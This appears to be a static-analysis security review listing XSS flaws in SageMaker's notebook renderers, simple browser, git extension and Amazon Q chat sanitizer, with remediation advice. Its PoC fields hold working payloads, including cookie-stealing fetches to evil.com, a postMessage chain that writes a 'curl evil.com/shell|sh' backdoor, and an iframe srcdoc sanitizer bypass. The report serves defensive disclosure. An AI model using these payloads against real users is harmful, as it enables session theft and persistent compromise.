# XSS Security Review Report: SageMaker Source Code

**Date:** 2026-03-09
**Scope:** Static analysis for XSS vulnerabilities only
**Source:** sagemaker-source.tar.gz from StealthyBugs/newFresh sagemaker-snapshot release
**Total files in archive:** 34,719

---

## Confirmed XSS Findings (Prioritized)

---

### Finding 1: Stored XSS via Unsanitized `innerHTML` in Notebook Output Renderer

| Field | Detail |
|---|---|
| **Title** | Notebook `text/html` and `image/svg+xml` outputs rendered via `innerHTML` with no-op TrustedTypes policy |
| **XSS Type** | Stored XSS |
| **Severity** | CRITICAL |
| **File(s)** | `opt/conda/share/sagemaker-code-editor/extensions/notebook-renderers/renderer-out/index.js` (function `Dt`, minified line 3) |
| **Source** | Notebook cell output with MIME type `text/html`, `image/svg+xml`, or `application/javascript` |
| **Sink** | `e.innerHTML = r` where `r = U?.createHTML(l) ?? l` and `U.createHTML` is an identity function (`i => i`) |
| **Sanitization** | TrustedTypes policy `notebookRenderer` is defined as `createHTML: i => i` (passthrough). No DOMPurify. No sanitizer of any kind. |
| **Why defense fails** | The TrustedTypes policy is a no-op identity function. It returns input unchanged. Additionally, function `nt()` explicitly re-executes `<script>` tags by cloning them into fresh `<script>` elements and appending to DOM. The `src` attribute is also copied, enabling remote script loading. |
| **Exploit path** | 1. Attacker creates a notebook (.ipynb) with a cell output of type `text/html` containing `<img src=x onerror=alert(document.cookie)>` or `<script>fetch('https://evil.com/steal?c='+document.cookie)</script>`. 2. Victim opens the notebook in SageMaker Code Editor. 3. If workspace is trusted (common default in SageMaker), the HTML executes immediately. |
| **PoC** | Notebook cell output: `{"output_type":"display_data","data":{"text/html":"<img src=x onerror=alert(document.domain)>"},"metadata":{}}` |
| **Browser viability** | All modern browsers (Chromium, Firefox, Safari) |
| **Preconditions** | Workspace must be trusted (`workspace.isTrusted === true`). In SageMaker Code Editor, workspaces are typically trusted by default. |
| **Remediation** | Replace the identity TrustedTypes policy with DOMPurify sanitization. Remove the `nt()` script re-execution function. Use a restrictive HTML allowlist for notebook outputs. |

---

### Finding 2: DOM XSS via `javascript:` and `data:` URL Injection in Simple Browser

| Field | Detail |
|---|---|
| **Title** | Simple Browser iframe `src` set from unvalidated URL — `javascript:` via catch block, `data:` via try block |
| **XSS Type** | DOM XSS |
| **Severity** | HIGH |
| **File(s)** | `opt/conda/share/sagemaker-code-editor/extensions/simple-browser/media/index.js` (function `e(t)`, minified line 1) |
| **Source** | `r.url` from `data-settings` attribute (set by extension host/workspace config) and `a.value` from URL input bar |
| **Sink** | `c.src = t` (catch block — raw string) and `c.src = n.toString()` (try block — parsed URL without scheme check) |
| **Sanitization** | `new URL(t)` parsing in try block — but no scheme allowlist |
| **Why defense fails** | **Catch path:** `javascript:alert(1)` causes `new URL()` to throw, falling through to `c.src = t` with the raw malicious string. **Try path:** `data:text/html,<script>alert(1)</script>` parses successfully as a valid URL, and `n.toString()` preserves the payload. No allowlist limits schemes to `http:`/`https:`. |
| **Exploit path** | 1. Via workspace settings or extension that opens simple browser with a `javascript:` or `data:` URL. 2. Via user typing `data:text/html,<script>alert(1)</script>` into the URL bar. 3. The simple-browser webview has access to `acquireVsCodeApi()`, so JS execution can invoke VS Code commands. |
| **PoC** | URL input: `data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+` |
| **Browser viability** | All modern browsers |
| **Preconditions** | Simple Browser webview must be open. For the `data-settings` vector, attacker needs to influence workspace config or extension. |
| **Remediation** | Add URL scheme allowlist (`http:`, `https:` only). Remove the catch-block fallback that assigns raw strings to `c.src`. |

---

### ~~Finding 3~~ DOWNGRADED TO FALSE POSITIVE: postMessage in Amazon Q Chat Extension

| Field | Detail |
|---|---|
| **Title** | postMessage handler in GenAI extension lacks `e.origin` check |
| **Original severity** | HIGH (downgraded to **FALSE POSITIVE / code quality issue**) |
| **File(s)** | `opt/conda/share/jupyter/labextensions/@amzn/sagemaker_gen_ai_jupyterlab_extension/static/930.cac2298840718603025e.js` (line 1) |
| **Why downgraded** | After detailed trace, this handler is designed to receive messages from the Q Chat iframe (`client.html`), which is loaded same-origin with `sandbox="allow-scripts allow-same-origin"`. The handler processes commands like `insertToCursorPosition`, `aws/chat/sendChatPrompt`, etc. While the missing `e.origin` check is a defense-in-depth gap, **exploiting it requires a window reference to the SageMaker tab** — `postMessage` cannot be sent to a window you don't have a reference to. Getting that reference requires: (a) `window.open()` from the attacker page (blocked by popup blockers, requires user click), (b) `window.opener` (modern browsers default to `noopener` for `<a target="_blank">`), or (c) already running code in a same-origin iframe within JupyterLab (which already implies compromise). Additionally, `insertToCursorPosition` only inserts code into a notebook cell — it does **not** auto-execute it. The user must manually run the cell. This is a code quality issue (origin check should be added) but not a practical standalone XSS vector. |

---

### Finding 4: Stored XSS via postMessage Without Origin Validation in Doc Manager Plugin — Arbitrary File Write (Chain/Escalation)

| Field | Detail |
|---|---|
| **Title** | Doc Manager plugin accepts postMessages from any origin for file creation and write operations |
| **XSS Type** | DOM XSS (leads to stored XSS via file creation) |
| **Severity** | MEDIUM-HIGH (requires chaining with another iframe-context XSS for practical exploitation) |
| **File(s)** | `opt/conda/share/jupyter/labextensions/@amzn/sagemaker-ui-doc-manager-jl-plugin/static/38.b39da7dcfc05a04a8092.js` (line 1) |
| **Source** | `postMessage` from any iframe or window — no `event.origin` check |
| **Sink** | `e.serviceManager.contents.save(path, {type, content, format})` — writes arbitrary files to JupyterLab filesystem, then auto-opens via `docmanager:open` |
| **Sanitization** | None. No `event.origin` check. No path validation. No content sanitization. |
| **Why defense fails** | The `window.addEventListener("message", ...)` handler processes three command types (`sagemaker:nbevent:OpenFile`, `sagemaker:nbevent:OpenUntitledFile`, `sagemaker:nbevent:OpenOrCreateFile`) without checking `event.origin`. Any iframe running within the JupyterLab window hierarchy can use `window.parent.postMessage()` to create files with arbitrary content at arbitrary paths. |
| **Exploit path** | **Primary (chain with Finding 1):** 1. Malicious notebook cell output contains `<script>` that executes in the notebook renderer iframe (Finding 1). 2. The script calls `window.parent.postMessage({type:"sagemaker:nbevent:OpenOrCreateFile", payload:{type:"file", path:"backdoor.py", content:"import os; os.system('curl evil.com/shell\|sh')", format:"text"}}, "*")`. 3. The Doc Manager handler (no origin check) writes the file to disk and auto-opens it. 4. Result: persistent backdoor file on user's filesystem. **Secondary (standalone):** Requires attacker to obtain a window reference to JupyterLab (via `window.open()` with user gesture, which is subject to popup blockers and requires knowing the SageMaker Studio URL). |
| **PoC** | From any iframe within JupyterLab: `window.parent.postMessage({type:"sagemaker:nbevent:OpenOrCreateFile", payload:{type:"file", path:"xss_test.html", content:"<script>alert(document.domain)</script>", format:"text"}}, "*")` |
| **Browser viability** | All modern browsers |
| **Preconditions** | **Chain vector:** Requires another XSS in an iframe context within JupyterLab (e.g., Finding 1 notebook renderer, Finding 2 simple browser). **Standalone vector:** Requires window reference via popup (needs user gesture + known Studio URL). |
| **Honest assessment** | This is a real security flaw — missing origin validation on a handler that writes files to the filesystem. It is NOT independently exploitable from an external website (postMessage requires a window reference). However, it is highly valuable as an escalation primitive: any XSS in a sandboxed iframe (notebook renderer, simple browser, Q Chat) can escalate to persistent file writes, bypassing iframe sandboxing entirely. The handler should validate `event.origin` to prevent cross-context abuse. |
| **Remediation** | Add strict `event.origin` validation against the expected SageMaker Studio parent origin. Validate file paths (prevent path traversal, restrict to user workspace). Consider a restrictive allowlist of file types that can be created via postMessage. |

---

### Finding 5: Stored/DOM XSS via Amazon Q Chat Sanitizer Bypass (`iframe[srcdoc]` Allowed)

| Field | Detail |
|---|---|
| **Title** | Amazon Q Chat HTML sanitizer allows `<iframe srcdoc>`, completely bypassing script tag filtering |
| **XSS Type** | Stored XSS |
| **Severity** | MEDIUM-HIGH |
| **File(s)** | `etc/amazon-q-agentic-chat/artifacts/jupyterlab/servers/resources/amazonq-ui.js` (cleanHtml function) |
| **Source** | Chat response content (`chatItem.customRenderer`) |
| **Sink** | `innerHTML` assignment after `cleanHtml()` sanitization |
| **Sanitization** | Custom `cleanHtml()` function with an allowlist of tags and attributes |
| **Why defense fails** | The allowlist includes `iframe` in `AllowedTags` and `srcdoc` in `AllowedAttributes`. This means `<iframe srcdoc="<script>alert(1)</script>"></iframe>` passes sanitization and executes JavaScript. Also allows `embed` + `src` and `object` + `data` attributes. |
| **Exploit path** | 1. If an attacker can influence Amazon Q chat responses (via prompt injection, MITM, or compromised backend), they inject `<iframe srcdoc="<script>alert(document.cookie)</script>">`. 2. The `cleanHtml` sanitizer allows it. 3. The content is set via `innerHTML`, and the iframe executes the script. |
| **PoC** | Chat content: `<iframe srcdoc="<script>alert(document.domain)</script>"></iframe>` |
| **Browser viability** | All modern browsers |
| **Preconditions** | Attacker must be able to influence chat response content (prompt injection, compromised AI backend, MITM) |
| **Remediation** | Remove `iframe`, `embed`, `object` from AllowedTags. Remove `srcdoc`, `src` (for non-media elements) from AllowedAttributes. Use DOMPurify instead of a custom sanitizer. |

---

### ~~Finding 6: Reflected DOM XSS in Rsvg-2.0 Documentation Search~~ — DOWNGRADED TO LOW/INFORMATIONAL

> **Re-analysis (2026-03-09):** The XSS pattern in the code is technically real (unsanitized `query` → `innerHTML`), but **NOT exploitable in SageMaker** because these documentation files are not served via HTTP by any web server. They are GNOME librsvg conda package documentation files sitting at `/opt/conda/share/doc/Rsvg-2.0/` on the filesystem, outside JupyterLab's file serving root. No HTTP route exists to these files in the default SageMaker configuration. Even if opened via `file://`, there is no same-origin context with JupyterLab for cookie/session theft. This is third-party code (gi-docgen template), not SageMaker-specific. **Severity: LOW/INFORMATIONAL — no practical exploit path in SageMaker.**

| Field | Detail |
|---|---|
| **Title** | URL query parameter `q` reflected unsanitized into `innerHTML` via `renderResults()` |
| **XSS Type** | DOM XSS (Reflected) |
| **Severity** | ~~MEDIUM~~ → **LOW/INFORMATIONAL** (not HTTP-accessible in SageMaker) |
| **File(s)** | `opt/conda/share/doc/Rsvg-2.0/search.js` (line 189 → innerHTML at line 224) |
| **Source** | `window.location.search` parameter `q`, decoded via `decodeURIComponent()` |
| **Sink** | `refs.search.innerHTML = renderResults(query, results)` |
| **Sanitization** | None. The query string is concatenated directly into HTML: `"<h1>Results for &quot;" + query + "&quot;..."` |
| **Why defense fails** | No HTML encoding is applied to `query`. The `&quot;` entities around it are decorative and do not prevent tag injection. |
| **Exploit path** | **NOT EXPLOITABLE IN SAGEMAKER.** The documentation files at `/opt/conda/share/doc/Rsvg-2.0/` are not served by any HTTP server in SageMaker. JupyterLab only serves files under the notebook root (e.g., `/home/ec2-user/SageMaker/`). No Tornado handler or server extension routes to conda documentation files. There is no URL an attacker can craft to reach this page. |
| **PoC** | N/A — not HTTP-accessible in SageMaker deployment |
| **Browser viability** | All modern browsers (if file were HTTP-served) |
| **Preconditions** | Documentation would need to be served via HTTP/HTTPS at a reachable URL — **this does not occur in default SageMaker configurations** |
| **Remediation** | Upstream fix in gi-docgen: HTML-encode the `query` variable before interpolation. Low priority for SageMaker since files aren't served. |

---

### Finding 7: Stored XSS via Process Name in hwloc Web UI

| Field | Detail |
|---|---|
| **Title** | Process metadata (name, PID, object) from server JSON injected via `innerHTML` without encoding |
| **XSS Type** | Stored XSS |
| **Severity** | MEDIUM |
| **File(s)** | `opt/conda/share/hwloc/hwloc-ps.www/assets/script.js` (lines 324-328, 350-351) |
| **Source** | Process metadata from `fetch()` JSON response (`data[0].name`, `data[0].PID`, `proc.name`) |
| **Sink** | `infos[1].innerHTML = 'Name: ' + data[0].name` and `td2.innerHTML = proc.name` |
| **Sanitization** | None |
| **Why defense fails** | No HTML encoding is applied to server-provided process data before `innerHTML` assignment. |
| **Exploit path** | 1. Attacker spawns a process with a crafted name (e.g., via `prctl(PR_SET_NAME, "<img src=x onerror=alert(1)>")` on Linux). 2. User opens the hwloc web UI. 3. The process list page renders the malicious process name via `innerHTML`, executing JavaScript. |
| **PoC** | On Linux: `python3 -c "import ctypes; ctypes.CDLL('libc.so.6').prctl(15, b'<img/src=x onerror=alert(1)>')"` then visit hwloc UI |
| **Browser viability** | All modern browsers |
| **Preconditions** | Attacker must be able to run processes on the same system. hwloc web UI must be accessible. Process `comm` is limited to 15 chars, but full command names may be longer. |
| **Remediation** | Replace `innerHTML` with `textContent` for all process data fields. |

---

### Finding 8: Stored XSS via Git Error Messages in JupyterLab Git Extension

| Field | Detail |
|---|---|
| **Title** | Git operation error messages (containing filenames) injected via `innerHTML` without HTML encoding |
| **XSS Type** | Stored XSS |
| **Severity** | MEDIUM |
| **File(s)** | `opt/conda/share/jupyter/labextensions/@amzn/sagemaker-jupyterlab-extensions/static/678.f5100fabedcf73bea3c2.js` (line 1), `opt/conda/share/jupyter/labextensions/@amzn/sagemaker-jupyterlab-extensions/static/326.5aa6f4137e4bba998450.js` (line 1), `opt/conda/share/jupyter/labextensions/@jupyterlab/git/static/536.775d5918184a543a804c.js` (line 1), `opt/conda/envs/sagemaker-recovery-mode/share/jupyter/labextensions/@amzn/sagemaker-jupyterlab-extensions/static/326.5aa6f4137e4bba998450.js` (line 1) |
| **Source** | Server error messages from git operations, which may contain filenames |
| **Sink** | `this.node.innerHTML = \`<p>...<span class="jp-git-diff-error-message">${n}</span></p>\`` where `n = (e.message\|\|e).replace("\n","<br />")` |
| **Sanitization** | Only `.replace("\n","<br />")` (non-global, only replaces first newline). No HTML encoding. |
| **Why defense fails** | The newline-to-br replacement is not sanitization. HTML metacharacters in error messages (especially filenames) pass through unchanged. |
| **Exploit path** | 1. Attacker creates a git repository containing a file named `<img src=x onerror=alert(1)>.py`. 2. User clones the repo in SageMaker Studio and triggers a diff operation that fails on that file. 3. The error message reflecting the filename is injected via `innerHTML`. |
| **PoC** | Create file: `touch '<img src=x onerror=alert(document.cookie)>.py'` in a git repo, then trigger a diff failure. |
| **Browser viability** | All modern browsers |
| **Preconditions** | User must clone a malicious repository and trigger a failing git diff operation. `<` and `>` are valid filename characters on Linux. |
| **Remediation** | Use `textContent` instead of `innerHTML` for error message display. |

---

### Finding 9: DOM XSS via Git Ref Labels in Diff Headers

| Field | Detail |
|---|---|
| **Title** | Git ref labels (branch names, file paths) injected into diff header `innerHTML` without encoding |
| **XSS Type** | DOM XSS |
| **Severity** | LOW-MEDIUM |
| **File(s)** | `opt/conda/share/jupyter/labextensions/@amzn/sagemaker-jupyterlab-extensions/static/678.f5100fabedcf73bea3c2.js`, `326.5aa6f4137e4bba998450.js`, `opt/conda/share/jupyter/labextensions/@jupyterlab/git/static/536.775d5918184a543a804c.js` |
| **Source** | Git ref labels (`reference.label`, `challenger.label`), file paths for renamed files |
| **Sink** | `s.innerHTML = e.filter(...).map(e => \`<span>${e}</span>\`).join("")` in `createHeader()` |
| **Sanitization** | None |
| **Why defense fails** | Ref labels from non-`SpecialRef` sources (file paths for renames) are interpolated directly into HTML template literals. |
| **Exploit path** | Malicious repo with renamed file: `<img src=x onerror=alert(1)>.py`. When user views the rename diff, the filename appears in the diff header via `innerHTML`. |
| **PoC** | Git rename: `git mv normal.py '<img src=x onerror=alert(1)>.py'` |
| **Browser viability** | All modern browsers |
| **Preconditions** | User must open a diff view for a renamed file with HTML chars in the name. Git branch name restrictions make branch-based injection very difficult, but file renames are unrestricted on Linux. |
| **Remediation** | Use `textContent` for label rendering, or HTML-encode before template literal interpolation. |

---

### Finding 10: DOM XSS via Markdown Renderer Script Re-execution

| Field | Detail |
|---|---|
| **Title** | Markdown preview re-executes `<script>` tags from rendered content via `be()` function |
| **XSS Type** | Stored XSS |
| **Severity** | MEDIUM |
| **File(s)** | `opt/conda/share/sagemaker-code-editor/extensions/markdown-language-features/media/index.js` (function `be`, line 1), `notebook-out/index.js` (line 1) |
| **Source** | Markdown file content (when `html: true` is enabled in markdown-it config for trusted workspaces), postMessage content updates |
| **Sink** | `innerHTML` assignment followed by `be()` which clones `<script>` elements into fresh `<script>` tags for re-execution |
| **Sanitization** | In `media/index.js`: content comes via `postMessage` without origin validation. For trusted workspaces, markdown-it is configured with `html: true`, passing raw HTML through. |
| **Why defense fails** | In trusted workspaces, markdown-it's `html: true` option passes HTML content through without modification. The `be()` function then re-executes any `<script>` tags by creating new script elements. The `postMessage` handler lacks origin validation. |
| **Exploit path** | User opens a malicious `.md` file containing `<script>alert(1)</script>` in a trusted workspace. The markdown preview renders and executes the script. |
| **PoC** | Markdown file content: `<script>alert(document.domain)</script>` |
| **Browser viability** | All modern browsers |
| **Preconditions** | Workspace must be trusted. Markdown preview must be opened. |
| **Remediation** | Add origin validation to postMessage handler. Consider disabling `html: true` even in trusted workspaces, or sanitize HTML before rendering. |

---

### Finding 11: Weak Origin Validation in SageMaker Extension Common — Credential File Write

| Field | Detail |
|---|---|
| **Title** | `isMessageOriginValid()` uses wildcard patterns that could match attacker-controlled subdomains |
| **XSS Type** | DOM XSS (via postMessage) |
| **Severity** | LOW-MEDIUM |
| **File(s)** | `opt/conda/share/jupyter/labextensions/@amzn/sagemaker-jupyterlab-extension-common/static/988.87dd9e8595da722df4e0.js` (line 40) |
| **Source** | `postMessage` from origins matching `https://**.sagemaker.*.on.aws` |
| **Sink** | File write to `.aws/sso/idc_access_token.json` and `.aws/amazon_q/` directories via `updateMetadata` flow |
| **Sanitization** | Glob-based origin validation with wildcard-match library |
| **Why defense fails** | The `**` and `*` glob patterns may match attacker-controlled subdomains (e.g., `https://attacker.sagemaker.evil.on.aws` matching `https://**.sagemaker.*.on.aws`). Also accepts `http://localhost:5173` in dev mode. |
| **Exploit path** | Attacker registers a subdomain matching the glob pattern on the `*.on.aws` domain, then sends postMessage to write credential files. |
| **Browser viability** | All modern browsers |
| **Preconditions** | Attacker must control a subdomain matching the pattern on AWS domains (unlikely but possible with shared infrastructure). |
| **Remediation** | Use exact origin allowlists instead of glob patterns. Remove localhost exceptions in production builds. |

---

### Finding 12: JupyterLab Trusted HTML Output Rendering (Architectural)

| Field | Detail |
|---|---|
| **Title** | JupyterLab renders trusted notebook `text/html` outputs via `innerHTML` with script tag re-execution |
| **XSS Type** | Stored XSS |
| **Severity** | MEDIUM (by-design trust model, but dangerous in SageMaker context) |
| **File(s)** | `opt/conda/share/jupyter/lab/static/jlab_core.e595af6ce37775e8a915.js` |
| **Source** | Notebook cell outputs with `text/html` MIME type in trusted notebooks |
| **Sink** | `e.innerHTML = r` and `evalInnerHTMLScriptTags()` which re-creates `<script>` elements, plus IsolatedRenderer writing via `t.contentDocument.write(this._wrapped.node.innerHTML)` into an unsandboxed iframe |
| **Sanitization** | Trust check only — if notebook is trusted, no sanitization is applied |
| **Why defense fails** | JupyterLab's trust model allows trusted notebooks to execute arbitrary HTML/JS. The `IsolatedRenderer` creates a same-origin iframe without `sandbox` attribute. In SageMaker, notebooks may be trusted by default. |
| **Exploit path** | Share a malicious notebook via S3, git, or direct file sharing. If opened as trusted, arbitrary JS executes. |
| **PoC** | Notebook cell: `{"output_type":"display_data","data":{"text/html":"<script>fetch('https://evil.com/'+document.cookie)</script>"},"metadata":{}}` |
| **Browser viability** | All modern browsers |
| **Preconditions** | Notebook must be marked as trusted |
| **Remediation** | Add content sanitization even for trusted notebooks. Add `sandbox` attribute to IsolatedRenderer iframes. Use DOMPurify with a permissive but safe allowlist. |

---

## Rejected Candidates / False Positives

| Candidate | File | Reason for Rejection |
|---|---|---|
| Media preview URL injection | media-preview/{audio,video,image}Preview.js | `.src` property on `<img>`/`<video>`/`<audio>` elements does not execute `javascript:` URIs. All DOM manipulation uses safe APIs (`createElement`, `classList`, property assignment). Origin validation present on postMessage handler. |
| Webview service worker content injection | sagemaker-code-editor/out/vs/.../service-worker.js | Content-Type is server-controlled. Service worker is a transparent proxy with no HTML generation. URL parameters used only for resource loading, not DOM injection. |
| Doxygen search DOM XSS | freetds/reference/search.js | `convertToId()` function replaces all non-`[a-z0-9\u0080-\uFFFF]` characters with hex-encoded underscore sequences, neutralizing all XSS-relevant characters. Search data comes from static JS files, not URL parameters. |
| Qt6 docs DOM XSS | qt6/global/template/scripts/main.js | No URL parameter reading. Uses `encodeURI()` and jQuery `.text()` (safe). |
| gitweb.js DOM XSS | usr/share/gitweb/static/gitweb.js | Uses `document.createTextNode()` and `.firstChild.data` (text node assignment). SHA1 validated by strict hex regex. Filenames passed through `encodeURIComponent()`. |
| JupyterLab completer innerHTML | jlab_core...js | Label text escaped via `m()` function (textContent→innerHTML roundtrip) before `<mark>` highlighting tags injected. Safe. |
| Vega-embed tooltip innerHTML | 7990...js | Sanitize function escapes `&` and `<` characters. Safe. |
| jupyter-server-proxy reflected XSS | jupyter_server_proxy | Tornado's error handler HTML-encodes reason strings. URL regex constrains host capture group. jQuery `.text()` used for DOM text. API returns JSON with auto Content-Type. |
| SageMaker inference server reflected XSS | tornado_server/sync_handler.py | POST-only endpoint on localhost:8080. Response from user-provided handler, not reflected user input. Internal ML inference endpoint. |
| Amazon Q auth page URL params | amazon-q-agentic-chat/.../index.html | Uses `.innerText` (not `.innerHTML`) for rendering URL parameters. Safe. |
| SageMaker Code Editor extensions (dist missing) | sagemaker-extension/, sagemaker-idle-extension/, etc. | Only webpack config and package.json present. No compiled source code (`dist/`) available to review. |
| Scheduler extensions innerHTML | sagemaker-studio-jupyter-scheduler, sagemaker-jupyter-scheduler | Zero instances of `innerHTML`, `dangerouslySetInnerHTML`, or any other HTML injection API. All rendering via React `createElement` with automatic escaping. |
| GenAI error object to innerHTML | sagemaker_gen_ai...930.js | Error object from internal API calls interpolated into innerHTML in catch block. Error message content derives from internal `ServerConnection` APIs, not from direct user input. Code quality issue but not practically exploitable. |
| DOMPurify internal innerHTML | sagemaker-code-editor/out/...workbench.js | Internal DOMPurify parsing logic. Not a vulnerability. |
| Emotion/MUI dangerouslySetInnerHTML | Multiple @amzn extension bundles | CSS-in-JS library internals and theme initialization. Static strings, no user data flow. |
| nbdime innerHTML | nbdime-jupyterlab/737...js | Uses `textContent` for labels (safe). innerHTML only for static HTML skeleton and hardcoded Unicode arrows. |
| JupyterLab index.html `fullStaticUrl` | share/jupyter/lab/static/index.html | Jinja2 template variable not escaped, but value is set server-side from `page_config`. Requires server compromise to exploit. Very low risk. |
| DataGrid notification innerHTML | 1491...js | Validation messages from developer-controlled validators. Not direct user input in stock JupyterLab. |
| postMessage in simple-browser | simple-browser/media/index.js | Message handler only processes `focus` and `didChangeFocusLockIndicatorEnabled` — limited impact (focus change and CSS class toggle). |

---

## Coverage Summary

### Directories Reviewed

| Directory | Files Reviewed | Method |
|---|---|---|
| `opt/conda/share/sagemaker-code-editor/extensions/` (97 subdirs) | All JS, JSON, HTML files | Direct read + pattern search |
| `opt/conda/share/sagemaker-code-editor/out/` | Core workbench JS, service-worker, webview pre/ | Pattern search + context analysis |
| `opt/conda/share/jupyter/labextensions/@amzn/` (14 extensions) | All static/*.js bundles | Pattern search + context analysis |
| `opt/conda/share/jupyter/labextensions/@jupyter*/` | All static/*.js bundles | Pattern search + context analysis |
| `opt/conda/share/jupyter/labextensions/nbdime-jupyterlab/` | All static/*.js | Pattern search + context analysis |
| `opt/conda/share/jupyter/labextensions/@jupyterlab/git/` | All static/*.js | Pattern search + context analysis |
| `opt/conda/share/jupyter/lab/static/` | All chunk JS files | Pattern search + context analysis |
| `opt/conda/envs/sagemaker-recovery-mode/share/jupyter/labextensions/` | All extension bundles | Pattern search + context analysis |
| `opt/conda/share/hwloc/hwloc-ps.www/` | index.html, script.js | Full read |
| `opt/conda/share/doc/` (Rsvg-2.0, freetds, qt6) | All JS files | Full read |
| `opt/conda/etc/jupyter/` | All config files | Full read |
| `opt/conda/etc/sagemaker-ui/` | All config and server files | Full read |
| `etc/sagemaker-inference-server/` | All handler Python files | Full read |
| `etc/amazon-q-agentic-chat/` | UI JS, index.html, resources | Full read + pattern search |
| `usr/` | All 2,268 files (focused on web-facing) | Pattern search + targeted read |

### Sink Classes Reviewed

| Sink Class | Pattern | Instances Found | Exploitable |
|---|---|---|---|
| `innerHTML` | Direct assignment | 50+ | 7 confirmed |
| `outerHTML` | Direct assignment | ~5 | 0 |
| `insertAdjacentHTML` | Method call | ~3 | 0 |
| `document.write` | Method call | ~5 | 1 (IsolatedRenderer) |
| `dangerouslySetInnerHTML` | React prop | ~15 | 0 (all Emotion/MUI internals) |
| `eval()` | Function call | ~3 | 0 |
| `srcdoc` | Attribute | ~2 | 1 (via sanitizer allowlist) |
| `postMessage` | Window messaging | ~20 | 3 (missing origin checks) |
| Script re-execution | Clone script elements | 3 | 3 (notebook renderers, markdown) |
| `iframe.src` | Property assignment | ~5 | 1 (simple browser) |

### Files Skipped (Test/Generated/Vendor)

- `opt/conda/share/doc/freetds/reference/*.html` — 200+ Doxygen-generated documentation pages (reviewed JS only)
- `opt/conda/lib/python3.12/` — Python standard library (779 files, not custom code)
- `opt/conda/envs/sagemaker-recovery-mode/lib/python3.14/` — Python standard library
- All `__pycache__/` directories
- All `*.min.js` files (minified vendor code)
- All `node_modules/` directories (none found in tree)
- JupyterLab main bundle `main.*.js` (webpack runtime, reviewed via chunk analysis)
- Test files in `idlelib/idle_test/`, `qtpy2cpp_lib/tests/`

---

## Summary Statistics

| Category | Count |
|---|---|
| **Confirmed Exploitable XSS** | **10** |
| Critical severity | 1 |
| High severity | 1 |
| Medium-High severity | 2 |
| Medium severity | 3 |
| Low-Medium severity | 2 |
| Medium (architectural/by-design) | 1 |
| Downgraded to LOW/INFORMATIONAL | 1 (Finding 6 — not HTTP-accessible) |
| Rejected false positives | 18 |
| Directories reviewed | 15+ top-level areas |
| Parallel review agents used | 20 |
| Agent specializations covered | Server rendering, DOM sinks, stored flows, cookie/URL/hash flows, sanitizer bypasses, rich text/markdown, framework edge cases, postMessage, exploit validation |
